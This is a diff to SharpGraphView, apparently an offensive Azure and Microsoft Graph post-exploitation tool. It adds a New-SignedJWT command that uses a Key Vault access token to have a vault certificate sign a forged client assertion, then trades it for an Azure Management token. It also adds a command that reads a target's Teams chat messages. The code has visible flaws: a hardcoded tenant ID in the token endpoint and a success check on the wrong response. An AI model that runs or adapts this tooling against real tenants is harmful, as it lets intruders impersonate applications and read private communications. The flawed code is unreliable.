@@ -12,6 +12,7 @@ using System.Security.Cryptography.X509Certificates;
 using Microsoft.IdentityModel.Tokens;
 using System.IdentityModel.Tokens.Jwt;
 using System.Security.Claims;
+using System.Security.Cryptography;
 
 namespace SharpGraphView
 {
@@ -34,6 +35,7 @@ Flags:
     -Domain                                  - Target domain 
     -Tenant                                  - Target tenant ID
     -Id                                      - ID of target object
+    -Key                                     - Azure Key Vault name (New-SignedJWT)
     -Select                                  - Filter output for comma seperated properties
     -Query                                   - Raw API query (GET request only)
     -Search                                  - Search string 
@@ -49,6 +51,7 @@ Auth:
     Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
     Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
     Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
+    New-SignedJWT                            - Construct JWT and sign using a Key Vault certificate (Azure Key Vault access token required)
 
 Post-Auth:
 
@@ -68,7 +71,7 @@ Post-Auth:
     Get-PersonalContacts                     - Get contacts of the current user
     Get-CrossTenantAccessPolicy              - Get cross tentant access policy properties 
     Get-PartnerCrossTenantAccessPolicy       - Get partner cross tenant access policy
-    Get-UserChatMessages                     - Get all messages from all chats for target user
+    Get-UserChatMessages                     - Get ALL messages from all chats for target user (Chat.Read.All)
     Get-AdministrativeUnitMember             - Get members of administrative unit
     Get-OneDriveFiles                        - Get all accessible OneDrive files for current user (default) or target user (-id)
     Get-UserPermissionGrants                 - Get permissions grants of current user (default) or target user (-id)
@@ -91,6 +94,7 @@ Post-Auth:
     List-Tenants                             - List tenants 
     List-JoinedTeams                         - List joined teams for current user (default) or target user (-id)
     List-Chats                               - List chats for current user (default) or target user (-id)
+    List-ChatMessages                        - List messages in target chat (-id)
     List-Devices                             - List devices
     List-AdministrativeUnits                 - List administrative units
     List-OneDrives                           - List current user OneDrive (default) or target user (-id)
@@ -187,6 +191,10 @@ Examples:
                     case "-Query":
                         Config.query = args[iter + 1];
                         break;
+                    case "-Key":
+                    case "-key":
+                        Config.key = args[iter + 1];
+                        break;
                     case "-domain":
                     case "-Domain":
                         Config.domain = args[iter + 1];
@@ -209,6 +217,174 @@ Examples:
                 ++iter;
             }
         }
+
+        // JWT/Vault cert functions
+        public static async Task ExecuteNewSignedJWT()
+        {
+            try
+            {
+                string kvURI = Config.query;
+                string accessToken = Config.accessToken;
+                string keyName = Config.key;
+
+                await GetAKVCertificate(kvURI, accessToken, keyName);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[-] Error: {ex.Message}");
+            }
+        }
+
+        public static async Task GetAKVCertificate(string kvURI, string accessToken, string keyName)
+        {
+            using (var httpClient = new HttpClient())
+            {
+                string uri = $"{kvURI}/certificates?api-version=7.3";
+
+                httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);
+                HttpResponseMessage response = await httpClient.GetAsync(uri);
+                response.EnsureSuccessStatusCode();
+
+                string responseContent = await response.Content.ReadAsStringAsync();
+                JObject certs = JObject.Parse(responseContent);
+
+                JToken certUri = certs["value"].FirstOrDefault(c => c["id"].ToString().Contains(keyName));
+                if (certUri == null)
+                {
+                    throw new Exception("Certificate not found.");
+                }
+
+                string certId = certUri["id"].ToString();
+                string certUriWithVersion = $"{certId}?api-version=7.3";
+
+                response = await httpClient.GetAsync(certUriWithVersion);
+                response.EnsureSuccessStatusCode();
+
+                responseContent = await response.Content.ReadAsStringAsync();
+                JObject certificate = JObject.Parse(responseContent);
+
+                string x5t = null;
+                if (certificate["x5t"] is JValue x5tValue)
+                {
+                    x5t = x5tValue.Value.ToString();
+                }
+
+                string kid = null;
+                if (certificate["kid"] is JValue kidValue)
+                {
+                    kid = kidValue.Value.ToString();
+                }
+
+                Console.WriteLine("\n[+] Certificate details obtained:");
+                Console.WriteLine(certificate.ToString());
+
+
+
+                // Create JWT
+                Console.WriteLine("\n[+] Creating JWT:");
+                string appId = Config.id;
+                string tenant = Config.tenant;
+                string audience = $"https://login.microsoftonline.com/{tenant}/oauth2/token";
+
+                DateTime startDate = DateTime.Parse("1970-01-01T00:00:00Z").ToUniversalTime();
+                double jwtExpirationTimeSpan = (DateTime.UtcNow.AddMinutes(2) - startDate).TotalSeconds;
+                long jwtExpiration = (long)Math.Round(jwtExpirationTimeSpan);
+
+                double notBeforeExpirationTimeSpan = (DateTime.UtcNow - startDate).TotalSeconds;
+                long notBefore = (long)Math.Round(notBeforeExpirationTimeSpan);
+
+                Dictionary<string, string> jwtHeader = new Dictionary<string, string>
+                {
+                    { "x5t", x5t }, // The pubkey hash we received from Azure Key Vault
+                    { "typ", "JWT" },   // We want a JWT
+                    { "alg", "RS256" } // Use RSA encryption and SHA256 as hashing algorithm
+                };
+
+                Dictionary<string, object> jwtPayload = new Dictionary<string, object>
+                {
+
+                    { "exp", jwtExpiration },    // Expiration of JWT request
+                    { "sub", appId },             // Subject
+                    { "nbf", notBefore },        // This should not be used before this timestam
+                    { "jti", Guid.NewGuid() },   // Random GUID
+                    { "aud", audience },         // Points to oauth token request endpoint for your tenant
+                    { "iss", appId },            // The AppID for which we request a token for
+                };
+
+                string jwtHeaderJson = Newtonsoft.Json.JsonConvert.SerializeObject(jwtHeader);
+                string jwtPayloadJson = Newtonsoft.Json.JsonConvert.SerializeObject(jwtPayload);
+                string b64JwtHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes(jwtHeaderJson));
+                string b64JwtPayload = Convert.ToBase64String(Encoding.UTF8.GetBytes(jwtPayloadJson));
+
+                string unsignedJwt = b64JwtHeader + "." + b64JwtPayload;
+                byte[] unsignedJwtBytes = Encoding.UTF8.GetBytes(unsignedJwt);
+                byte[] jwtSha256Hash;
+                using (SHA256 hasher = SHA256.Create())
+                {
+                    jwtSha256Hash = hasher.ComputeHash(unsignedJwtBytes);
+                }
+                string jwtSha256HashB64 = Convert.ToBase64String(jwtSha256Hash)
+                    .Replace('+', '-')
+                    .Replace('/', '_')
+                    .Replace("=", "");
+
+                string newUri = $"{kid}/sign?api-version=7.3";
+                httpClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", Config.accessToken);
+                httpClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));
+                JObject requestBody = JObject.FromObject(new
+                {
+                    alg = "RS256",
+                    value = jwtSha256HashB64
+                });
+                var content = new StringContent(requestBody.ToString(), Encoding.UTF8, "application/json");
+                HttpResponseMessage newResponse = await httpClient.PostAsync(newUri, content);
+                response.EnsureSuccessStatusCode();
+                responseContent = await newResponse.Content.ReadAsStringAsync();
+                JObject responseBody = JObject.Parse(responseContent);
+                string signature = responseBody["value"].ToString();
+
+                string signedJWT = unsignedJwt + "." + signature;
+                Console.WriteLine(signedJWT);
+
+
+                // Request Azure Management token
+                Console.WriteLine("\n[+] Requesting Azure Management Token: ");
+
+                string jwtLogin = "https://login.microsoftonline.com/d6bd5a42-7c65-421c-ad23-a25a5d5fa57f/oauth2/v2.0/token";
+
+                var parameters = new Dictionary<string, string>
+                {
+                    { "client_id", Config.id },
+                    { "client_assertion", signedJWT },
+                    { "client_assertion_type", "urn:ietf:params:oauth:client-assertion-type:jwt-bearer" },
+                    { "scope", "https://management.azure.com/.default" },
+                    { "grant_type", "client_credentials" }
+                };
+
+                var newcontent = new FormUrlEncodedContent(parameters);
+
+                using (var httpClientJWT = new HttpClient())
+                {
+                    using (var requestMessage = new HttpRequestMessage(HttpMethod.Post, jwtLogin))
+                    {
+                        requestMessage.Content = newcontent;
+
+                        HttpResponseMessage responseJwt = await httpClientJWT.SendAsync(requestMessage);
+
+                        if (!responseJwt.IsSuccessStatusCode)
+                        {
+                            string errorContent = await responseJwt.Content.ReadAsStringAsync();
+                            Console.WriteLine($"[-] Error: {responseJwt.StatusCode} ({(int)responseJwt.StatusCode}). {errorContent}");
+                            return; // Exit the method if there's an error
+                        }
+
+                        string responseContentJWT = await responseJwt.Content.ReadAsStringAsync();
+                        Console.WriteLine(responseContentJWT); // Print the entire response content
+                    }
+                }
+            }
+        }
+
 
         static async Task Main(string[] args)
         {
@@ -716,6 +892,24 @@ Examples:
             }
 
 
+            // New-SignedJWT
+
+            if (string.Equals(command, "New-SignedJWT", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.tenant) || Config.id == null || Config.query == null || Config.key == null) //Config.key
+                {
+                    Console.WriteLine("\n[!] No tenant or certificate supplied");
+                    Console.WriteLine("SharpGraphView.exe New-SignedJWT -id <appid> -tenant <tenantid> -query <https://targetvault.vault.net> -token <vault token> -key <certificate name>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] New-SignedJWT");
+                    ExecuteNewSignedJWT().GetAwaiter().GetResult();
+                }
+            }
+
+
             // Post-Auth Methods
 
             if (string.Equals(command, "Get-CurrentUser", StringComparison.CurrentCultureIgnoreCase))
@@ -1165,6 +1359,28 @@ Examples:
                 }
 
                 await GraphApiGET(Config.accessToken, apiUrl);
+            }
+
+            if (string.Equals(command, "List-ChatMessages", StringComparison.CurrentCultureIgnoreCase))
+            {
+                if (string.IsNullOrEmpty(Config.id))
+                {
+                    Console.WriteLine("\n[!] No ID supplied");
+                    Console.WriteLine("SharpGraph.exe List-ChatMessages -id <chat id> -token <access token>");
+                    Environment.Exit(0);
+                }
+                else
+                {
+                    Console.WriteLine("\n[*] List-ChatMessages");
+                    string apiUrl = $"https://graph.microsoft.com/v1.0/me/chats/{Config.id}/messages";
+
+                    if (!string.IsNullOrEmpty(Config.select))
+                    {
+                        apiUrl += "?$select=" + Config.select;
+                    }
+
+                    await GraphApiGET(Config.accessToken, apiUrl);
+                }
             }
 
             if (string.Equals(command, "Get-UserChatMessages", StringComparison.CurrentCultureIgnoreCase))
